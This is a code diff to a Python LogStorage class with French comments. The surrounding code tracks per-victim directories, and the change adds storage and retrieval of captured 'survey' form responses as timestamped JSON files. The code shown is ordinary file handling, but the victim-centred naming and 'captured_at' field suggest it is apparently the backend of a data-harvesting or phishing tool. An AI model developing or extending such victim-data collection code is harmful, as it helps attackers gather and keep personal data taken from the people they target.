@@ -11,6 +11,7 @@ import config
 class LogStorage:
     def __init__(self):
         self.storage_dir = config.STORAGE_DIR
+        self.survey_dir = os.path.join(self.storage_dir, "surveys")
         self.ensure_storage_dir()
     
     def ensure_storage_dir(self):
@@ -20,6 +21,10 @@ class LogStorage:
         if not os.path.exists(self.storage_dir):
             os.makedirs(self.storage_dir)
             print(f"[+] Dossier de stockage créé: {self.storage_dir}")
+        
+        if not os.path.exists(self.survey_dir):
+            os.makedirs(self.survey_dir)
+            print(f"[+] Dossier de formulaires créé: {self.survey_dir}")
     
     def get_victim_dir(self, victim_id):
         """
@@ -159,4 +164,45 @@ class LogStorage:
                     count = 1
         
         return analysis
+    
+    def save_survey_response(self, survey_data):
+        """
+        Sauvegarde une réponse au formulaire
+        """
+        try:
+            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+            filename = f"survey_{timestamp}.json"
+            filepath = os.path.join(self.survey_dir, filename)
+            
+            # Ajouter un timestamp
+            survey_data['captured_at'] = datetime.now().isoformat()
+            
+            with open(filepath, 'w', encoding='utf-8') as f:
+                json.dump(survey_data, f, ensure_ascii=False, indent=2)
+            
+            return True
+        
+        except Exception as e:
+            print(f"[-] Erreur lors de la sauvegarde du formulaire: {e}")
+            return False
+    
+    def get_survey_responses(self):
+        """
+        Récupère toutes les réponses aux formulaires
+        """
+        if not os.path.exists(self.survey_dir):
+            return []
+        
+        responses = []
+        for filename in sorted(os.listdir(self.survey_dir), reverse=True):
+            if filename.endswith('.json'):
+                filepath = os.path.join(self.survey_dir, filename)
+                try:
+                    with open(filepath, 'r', encoding='utf-8') as f:
+                        response = json.load(f)
+                        responses.append(response)
+                except Exception as e:
+                    print(f"[-] Erreur lors de la lecture de {filepath}: {e}")
+        
+        return responses
 
